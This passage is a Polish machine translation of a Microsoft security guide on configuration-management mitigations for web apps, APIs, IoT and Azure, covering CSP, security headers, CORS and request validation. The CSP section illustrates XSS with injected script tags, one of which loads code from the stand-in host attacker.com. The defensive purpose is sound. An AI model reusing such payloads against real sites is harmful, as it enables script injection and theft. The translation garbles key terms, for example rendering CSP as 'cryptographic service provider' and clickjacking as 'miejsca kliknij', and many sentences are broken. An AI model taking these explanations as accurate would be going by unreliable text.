---
title: Konfiguracja zarządzania — narzędzie do modelowania zagrożeń firmy Microsoft — Azure | Dokumentacja firmy Microsoft
description: środki zaradcze dotyczące zagrożeń, widoczne w narzędziu do modelowania zagrożeń
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: 284d0e888b89d340088f770af22c026a861a4685
ms.sourcegitcommit: 41ca82b5f95d2e07b0c7f9025b912daf0ab21909
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 06/13/2019
ms.locfileid: "60610720"
---
# <a name="security-frame-configuration-management--mitigations"></a>Ramka zabezpieczeń: Zarządzanie konfiguracją | Środki zaradcze 
| Produkt/usługę | Artykuł |
| --------------- | ------- |
| **Aplikacja sieci Web** | <ul><li>[Implementowanie zasad zabezpieczeń zawartości (CSP), a następnie wyłącz javascript wbudowane](#csp-js)</li><li>[Włącz filtr XSS przeglądarki](#xss-filter)</li><li>[Aplikacje ASP.NET, należy wyłączyć śledzenie i debugowanie przed wdrożeniem](#trace-deploy)</li><li>[Skrypty JavaScript innych firm na dostęp tylko z zaufanych źródeł](#js-trusted)</li><li>[Upewnij się, że uwierzytelnionego strony ASP.NET zestawowi Redressing interfejsu użytkownika lub miejsca kliknij mechanizmów obronnych](#ui-defenses)</li><li>[Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS w aplikacji sieci Web ASP.NET](#cors-aspnet)</li><li>[Włącz atrybut parametr ValidateRequest na stronach ASP.NET](#validate-aspnet)</li><li>[Użyj lokalnie hostowanych najnowsze wersje bibliotek JavaScript](#local-js)</li><li>[Wyłącz automatyczne wykrywanie MIME](#mime-sniff)</li><li>[Usuwanie nagłówków standardowy serwer witryny sieci Web na Windows Azure w celu uniknięcia odcisków](#standard-finger)</li></ul> |
| **Baza danych** | <ul><li>[Konfigurowanie zapory Windows dla dostępu aparatu bazy danych](#firewall-db)</li></ul> |
| **Interfejs API sieci Web** | <ul><li>[Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS interfejsu API sieci Web platformy ASP.NET](#cors-api)</li><li>[Szyfruj sekcje internetowego interfejsu API plików konfiguracyjnych, które zawierają dane poufne](#config-sensitive)</li></ul> |
| **Urządzenia IoT** | <ul><li>[Upewnij się, że wszystkie interfejsów administracyjnych są zabezpieczone przy użyciu silnych poświadczeń](#admin-strong)</li><li>[Upewnij się, że nieznany kod nie można wykonać na urządzeniach](#unknown-exe)</li><li>[Szyfrowanie systemu operacyjnego i dodatkowe partycje urządzeń IoT za pomocą skrytki bitowe](#partition-iot)</li><li>[Upewnij się, że tylko minimalne usług/funkcji są włączone na urządzeniach](#min-enable)</li></ul> |
| **IoT Field Gateway** | <ul><li>[Szyfrowanie systemu operacyjnego i dodatkowe partycje bramy w terenie IoT przy użyciu bitowego skrytki](#field-bit-locker)</li><li>[Upewnij się, że poświadczenia logowania domyślnej bramy pola zostały zmienione podczas instalacji](#default-change)</li></ul> |
| **IoT Cloud Gateway** | <ul><li>[Upewnij się, że bramy w chmurze implementuje proces aktualizowania oprogramowania układowego połączonych urządzeń](#cloud-firmware)</li></ul> |
| **Maszyny granicy zaufania** | <ul><li>[Upewnij się, że urządzenia mają skonfigurowane zgodnie z zasadami organizacji kontroli zabezpieczeń punktu końcowego](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Upewnij się, bezpieczne zarządzanie kluczami dostępu do magazynu platformy Azure](#secure-keys)</li><li>[Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS w usłudze Azure storage](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Włączanie usługi WCF w funkcji ograniczania](#throttling)</li><li>[Ujawnienie informacji programu WCF za pomocą metadanych](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementowanie zasad zabezpieczeń zawartości (CSP), a następnie wyłącz javascript wbudowane

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Wprowadzenie do zasad zabezpieczeń zawartości](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [informacje o zasadach zabezpieczeń zawartości](https://content-security-policy.com/), [funkcje zabezpieczeń](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [wprowadzenie do zasad zabezpieczeń zawartości](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Można użyć dostawcy usług Kryptograficznych?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Kroki** | <p>Zasad zabezpieczeń zawartości (CSP) jest ochronę w głębi mechanizm zabezpieczeń, W3C standard, umożliwiająca właścicieli aplikacji sieci web mieć kontrolę nad osadzonej w lokacji zawartości. Dostawca usług Kryptograficznych jest dodawany jako nagłówka odpowiedzi HTTP, na serwerze sieci web i jest wymuszane po stronie klienta przez przeglądarki. To zasady oparte na liście dozwolonych elementów — witryny sieci Web można zadeklarować zestaw zaufanych domen, z którym zawartość jest aktywne, takich jak JavaScript, które mogą zostać załadowane.</p><p>Dostawca usług chmury zapewnia następujące korzyści zabezpieczeń:</p><ul><li>**Ochrona przed XSS:** Jeśli strona jest narażony na XSS, osoba atakująca może wykorzystać je na 2 sposoby:<ul><li>Wstrzykiwanie `<script>malicious code</script>`. Ten program wykorzystujący luki nie będzie działać z powodu dostawcy rozwiązań w Chmurze podstawowej ograniczeń-1</li><li>Wstrzykiwanie `<script src=”http://attacker.com/maliciousCode.js”/>`. Ten program wykorzystujący luki nie będzie działać, ponieważ nie będzie domenie osoba atakująca kontrolowane w dostawcy rozwiązań w Chmurze dozwolonych domen</li></ul></li><li>**Kontrolę nad wykradanie danych:** Jeśli wszystkie złośliwej zawartości sieci Web próbuje nawiązać połączenie z zewnętrznej witryny sieci Web i kradzieży danych, połączenie zostanie przerwane przy pomocy dostawcy CSP. Jest to spowodowane domeny docelowej nie będzie lista dozwolonych adresów dostawcy rozwiązań w Chmurze</li><li>**Obrony przed miejsca kliknij:** miejsca kliknij to technika ataku przy użyciu której osoba atakująca może klatki, oryginalnym użytkowników witryny sieci Web i Wymuś kliknij elementy interfejsu użytkownika. Obecnie obrony przed miejsca kliknij osiągnięte przez skonfigurowanie odpowiedzi nagłówek X-Frame-Options. Nie wszystkie przeglądarki przestrzegać tego pliku nagłówkowego przechodzenia do przodu dostawcy usług Kryptograficznych. zostanie ona standardowy sposób obrony przed miejsca kliknięcia</li><li>**Raportowanie w czasie rzeczywistym ataku:** W przypadku ataku polegającego na iniekcji w witrynie sieci Web z obsługą dostawcy usług Kryptograficznych, przeglądarek automatycznie wyzwoli powiadomienie, aby punkty końcowe skonfigurowane na serwerze sieci Web. Dzięki temu dostawcy usług Kryptograficznych służy jako system ostrzeżenie w czasie rzeczywistym.</li></ul> |

### <a name="example"></a>Przykład
Przykład zasad: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Te zasady umożliwiają skryptów w celu załadowania tylko z serwera i google analytics serwer aplikacji sieci web. Skrypty ładowane z innych lokacji zostanie odrzucone. Po włączeniu programu CSP w witrynie internetowej następujące funkcje są automatycznie wyłączane, aby uniknąć atakom XSS. 

### <a name="example"></a>Przykład
Wbudowane skrypty nie zostanie wykonany. Poniżej przedstawiono przykłady wbudowanych skryptach 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Przykład
Ciągi nie zostanie ono ocenione jako kod. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Włącz filtr XSS przeglądarki

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Filtr ochrony XSS](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Kroki** | <p>Konfiguracja nagłówka odpowiedzi X XSS ochrony określa filtr skryptu cross-site w przeglądarce. Ten nagłówek odpowiedzi może mieć następujące wartości:</p><ul><li>`0:` Spowoduje to wyłączenie filtru</li><li>`1: Filter enabled` Po wykryciu ataku skryptów między witrynami, aby zatrzymać ataku, przeglądarka zostanie oczyszczenia strony</li><li>`1: mode=block : Filter enabled`. Raczej niż na stronie po wykryciu ataku XSS, oczyszczaj przeglądarki uniemożliwi renderowanie strony</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Przeglądarka będzie oczyszczenia strony i zgłosić naruszenie.</li></ul><p>To jest funkcja przeglądarki Chromium, przy użyciu dostawcy usług Kryptograficznych naruszenie raportów szczegółów dowolnego identyfikatora URI. Opcje ostatnich 2 są uznawane za bezpieczne wartości.</p>|

## <a id="trace-deploy"></a>Aplikacje ASP.NET, należy wyłączyć śledzenie i debugowanie przed wdrożeniem

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Informacje o debugowaniu ASP.NET](https://msdn.microsoft.com/library/ms227556.aspx), [ASP.NET śledzenie — Przegląd](https://msdn.microsoft.com/library/bb386420.aspx), [jak: Włącz śledzenie dla aplikacji ASP.NET](https://msdn.microsoft.com/library/0x5wc973.aspx), [jak: Włącz debugowanie aplikacji ASP.NET](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Kroki** | Gdy włączone jest śledzenie dla strony przeglądarki, każdy proces żądania uzyskuje informacje o śledzeniu, który zawiera dane dotyczące stanu wewnętrznego serwera i przepływ pracy. Te informacje można zabezpieczenia poufnych. Debugowanie jest włączone dla strony, błędów, wykonywane na serwerze spowodować pełny stos danych śledzenia, przedstawione w przeglądarce. Te dane mogą ujawniać informacje związane z zabezpieczeniami dotyczące serwera przepływu pracy. |

## <a id="js-trusted"></a>Skrypty JavaScript innych firm na dostęp tylko z zaufanych źródeł

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | skrypty JavaScript innych firm powinna odwoływać się tylko z zaufanych źródeł. Punkty końcowe odwołania powinny zawsze być na protokół SSL. |

## <a id="ui-defenses"></a>Upewnij się, że uwierzytelnionego strony ASP.NET zestawowi Redressing interfejsu użytkownika lub miejsca kliknij mechanizmów obronnych

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Kliknij miejsca arkusz porad Defense OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [elementy wewnętrzne programu Internet Explorer — zwalczania miejsca kliknij z X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Kroki** | <p>miejsca kliknij znany także jako "interfejsu użytkownika odwoławcze ataku", to gdy osoba atakująca używa wielu warstw przezroczystego lub nieprzezroczystego do nakłonienia użytkownika do kliknięcie na przycisk lub łącze na innej stronie, gdy był pomyślny przebieg operacji kliknij na stronie najwyższego poziomu.</p><p>To nakładanie warstw jest osiągane przy tworzeniu złośliwego strony przy użyciu elementu iframe, który ładuje stronę ofiary. W związku z tym osoba atakująca "przejmuje" kliknięć przeznaczone do ich strony i routing je do innej strony, prawdopodobnie należy do innej aplikacji, domeny lub obu. Aby zapobiec atakom miejsca kliknij przycisk, ustaw odpowiednie nagłówki odpowiedzi HTTP X-Frame-Options, które poinstruowanie przeglądarki uniemożliwiają ramek z innych domen</p>|

### <a name="example"></a>Przykład
Nagłówek X-FRAME-OPTIONS można ustawić za pomocą usług IIS w pliku web.config. Fragment kodu pliku Web.config dla witryny, które nigdy nie powinny być sformułowane: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Przykład
Kod pliku Web.config dla witryny, które powinny być tylko obramowane przez strony w tej samej domenie: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS w aplikacji sieci Web ASP.NET

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Web Forms, MVC5 |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywany zasadami tego samego źródła i uniemożliwia złośliwym odczytywanie poufnych danych z innej lokacji. Jednak czasami może być wymagane do udostępnienia interfejsów API bezpiecznie inne witryny, dla których można korzystać. Krzyżowe CORS Origin Resource Sharing () jest to standard W3C, dzięki któremu serwer może Poluzować zasady tego samego źródła. Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin jednocześnie odrzucając inne.</p><p>CORS to bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP. Zasadniczo Włączanie funkcji CORS przekłada się na dodanie kilku nagłówków odpowiedzi HTTP (Access - Control-*) w sieci Web i aplikacji, to może odbywać się na kilka sposobów.</p>|

### <a name="example"></a>Przykład
Jeśli dostęp do pliku Web.config jest dostępny, mechanizm CORS, mogą być dodawane przy użyciu następującego kodu: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Przykład
Jeśli nie ma dostępu do pliku web.config, mechanizm CORS można skonfigurować, dodając następujący kod w języku CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Należy pamiętać, że jest krytyczne, aby upewnić się, że lista źródeł w atrybucie "Access-Control-Allow-Origin" jest ustawiona na zestaw ograniczone i zaufanych źródeł. Nie można skonfigurować niewłaściwie (np. ustawienie wartości jako "*") umożliwi złośliwych witryn wyzwolić żądania między źródłami do aplikacji sieci web > bez żadnych ograniczeń, sprawiając, że aplikacja narażone na ataki CSRF. 

## <a id="validate-aspnet"></a>Włącz atrybut parametr ValidateRequest na stronach ASP.NET

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Web Forms, MVC5 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Żądanie weryfikacji — zapobieganie atakom skryptów](https://www.asp.net/whitepapers/request-validation) |
| **Kroki** | <p>Weryfikacja żądania, funkcji programu ASP.NET od wersji 1.1, uniemożliwia serwera przyjmowanie zawartości zawierającego usunięcie zakodowanym formacie HTML. Ta funkcja została zaprojektowana, aby zapobiec atakom niektóre uruchomienie skryptu, zgodnie z którą kod skryptu klienta lub HTML może być nieświadomie przesłane do serwera, przechowywanych i przedstawiony w innym użytkownikom. Firma Microsoft nadal zdecydowanie zaleca zweryfikowanie wszystkich danych wejściowych i kodowanie HTML, gdy jest to odpowiednie.</p><p>Weryfikacja żądania jest wykonywane przez porównanie wszystkich danych wejściowych na listę potencjalnie niebezpiecznych wartości. W przypadku dopasowania ASP.NET zgłasza `HttpRequestValidationException`. Domyślnie funkcja Weryfikacja żądania jest włączona.</p>|

### <a name="example"></a>Przykład
Jednak ta funkcja może zostać wyłączona na poziomie strony: 
```XML
<%@ Page validateRequest="false" %> 
```
lub na poziomie aplikacji 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
. Pamiętaj, że funkcja weryfikacji żądania nie jest obsługiwane i nie jest częścią MVC6 potoku. 

## <a id="local-js"></a>Użyj lokalnie hostowanych najnowsze wersje bibliotek JavaScript

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | <p>Deweloperzy korzystający z standardowych bibliotek JavaScript, takie jak JQuery, należy użyć zatwierdzone wersje wspólnych bibliotek JavaScript, które nie zawierają luki w zabezpieczeniach znane. Dobrym rozwiązaniem jest użyć najbardziej najnowszą wersję bibliotek, ponieważ zawierają one poprawki zabezpieczeń dla znanych luk w zabezpieczeniach w ich starsze wersje.</p><p>Jeśli nie można użyć najnowszej wersji z powodu ze względu na zgodność poniżej minimalne wersje powinny być używane.</p><p>Dopuszczalne minimalne wersje:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery zweryfikować 1.9</li><li>JQuery Mobile 1.0.1</li><li>jQuery 2.99 cyklu</li><li>jQuery 1.9.0 DataTables</li></ul></li><li>**Zestawu narzędzi AJAX Control Toolkit**<ul><li>Zestawu narzędzi AJAX Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms i Ajax**<ul><li>ASP.NET Web Forms i Ajax 4</li><li>Ajax programu ASP.NET 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nigdy nie obciążenia dowolnej biblioteki języka JavaScript z zewnętrznych witryn, takie jak publiczne usługi CDN</p>|

## <a id="mime-sniff"></a>Wyłącz automatyczne wykrywanie MIME

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [IE8 Część zabezpieczeń V: Kompleksowa ochrona](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [typ MIME](https://en.wikipedia.org/wiki/Mime_type) |
| **Kroki** | Nagłówek X-zawartości-typ-Options jest nagłówek HTTP, która umożliwia deweloperom określić, że jego zawartość nie powinny być ten MIME. Ten nagłówek zaprojektowano w celu zmniejszenia wykrywanie MIME ataków. Dla każdej strony mogą zawierać treści, którymi można sterować użytkownika, należy użyć X nagłówka HTTP-zawartości — typ — opcje: nosniff. Aby włączyć wymagany nagłówek globalnie dla wszystkich stron w aplikacji, możesz wykonać jedną z następujących czynności|

### <a name="example"></a>Przykład
Dodaj nagłówek w pliku web.config, jeśli aplikacja jest hostowana przez Internet informacji Services (IIS) 7 lub nowszy. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Przykład
Dodaj nagłówek za pośrednictwem aplikacji globalnej\_BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Przykład
Implementowanie niestandardowego modułu HTTP 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Przykład
Należy włączyć wymaganego nagłówka tylko do konkretnych stron, dodając ją do poszczególnych odpowiedzi: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Usuwanie nagłówków standardowy serwer witryny sieci Web na Windows Azure w celu uniknięcia odcisków

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | EnvironmentType - Azure |
| **Odwołania**              | [Usuwanie nagłówków standardowy serwer w witrynach sieci Web Azure Windows](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Kroki** | Nagłówki, takich jak serwer X obsługiwane-przez, X-AspNet-Version ujawnić informacje dotyczące serwera i podstawowych technologii. Zalecane jest tym samym Pomiń te nagłówki zapobieganie odcisków aplikacji |

## <a id="firewall-db"></a>Konfigurowanie zapory Windows dla dostępu aparatu bazy danych

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Database (Baza danych) | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | SQL Azure, OnPrem |
| **Atrybuty**              | N/d, wersja SQL - V12 |
| **Odwołania**              | [Jak skonfigurować zaporę bazy danych Azure SQL](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [skonfigurować zaporę Windows dla dostępu aparatu bazy danych](https://msdn.microsoft.com/library/ms175043) |
| **Kroki** | Systemy zapory pomagają zapobiegać nieautoryzowanemu dostępowi do zasobów komputera. Dostęp do wystąpienia aparatu bazy danych programu SQL Server za pośrednictwem zapory, należy skonfigurować zaporę na komputerze z uruchomionym serwerem SQL, aby zezwolić na dostęp |

## <a id="cors-api"></a>Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS interfejsu API sieci Web platformy ASP.NET

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | MVC 5 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Włączanie żądań Cross-Origin we wzorcu ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [wzorca ASP.NET Web API — Obsługa mechanizmu CORS we wzorcu ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywany zasadami tego samego źródła i uniemożliwia złośliwym odczytywanie poufnych danych z innej lokacji. Jednak czasami może być wymagane do udostępnienia interfejsów API bezpiecznie inne witryny, dla których można korzystać. Krzyżowe CORS Origin Resource Sharing () jest to standard W3C, dzięki któremu serwer może Poluzować zasady tego samego źródła.</p><p>Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin jednocześnie odrzucając inne. CORS to bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP.</p>|

### <a name="example"></a>Przykład
W App_Start/WebApiConfig.cs Dodaj następujący kod do metody WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Przykład
Atrybut EnableCors można stosować do metod akcji w kontrolerze w następujący sposób: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Należy pamiętać, że koniecznie upewnij się, że lista źródeł w atrybucie EnableCors jest to zestaw ograniczone i zaufanych źródeł. Nie można skonfigurować niewłaściwie (np. ustawienie wartości jako "*") umożliwi złośliwych witryn wyzwolić żądania między źródłami do interfejsu API bez żadnych ograniczeń > sprawiając, że interfejs API narażone na ataki CSRF. EnableCors może korzystać na poziomie kontrolera. 

### <a name="example"></a>Przykład
Aby wyłączyć CORS dla określonej metody w klasie, atrybut DisableCors może być używany, jak pokazano poniżej: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | MVC 6 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Włączanie żądań Cross-Origin (CORS) w programie ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Kroki** | <p>W programie ASP.NET Core 1.0 CORS można włączyć za pomocą oprogramowania pośredniczącego lub za pomocą MVC. Włączanie mechanizmu CORS za pomocą MVC tych samych usług mechanizmu CORS są używane, ale nie jest oprogramowanie pośredniczące CORS.</p>|

**Podejście 1** włączenie mechanizmu CORS za pomocą oprogramowania pośredniczącego: Aby włączyć mechanizm CORS dla całej aplikacji, należy dodać oprogramowanie pośredniczące CORS do Potok żądań przy użyciu metody rozszerzenia UseCors. Podczas dodawania oprogramowanie pośredniczące CORS za pomocą klasy CorsPolicyBuilder można określić zasady cross-origin. Istnieją dwa sposoby, w tym celu:

### <a name="example"></a>Przykład
Pierwsza to wywołanie UseCors z wyrażenia lambda. Wyrażenie lambda przyjmuje obiekt CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Przykład
Drugi cel to zdefiniować co najmniej jedne zasady o nazwie CORS, a następnie wybierz pozycję zasady według nazwy w czasie wykonywania. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Podejście 2** włączenie mechanizmu CORS w MVC: Deweloperzy mogą również używać MVC do zastosowania określonego CORS każdej akcji, każdy kontroler lub globalnie dla wszystkich kontrolerów.

### <a name="example"></a>Przykład
Każdej akcji: Aby określić mechanizm CORS zasad dla określonej akcji, należy dodać atrybut [EnableCors] do akcji. Podaj nazwę zasad. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Przykład
Na kontrolerze: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Przykład
Globalny: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Należy pamiętać, że koniecznie upewnij się, że lista źródeł w atrybucie EnableCors jest to zestaw ograniczone i zaufanych źródeł. Nie można skonfigurować niewłaściwie (np. ustawienie wartości jako "*") umożliwi złośliwych witryn wyzwolić żądania między źródłami do interfejsu API bez żadnych ograniczeń > sprawiając, że interfejs API narażone na ataki CSRF. 

### <a name="example"></a>Przykład
Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Szyfruj sekcje internetowego interfejsu API plików konfiguracyjnych, które zawierają dane poufne

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
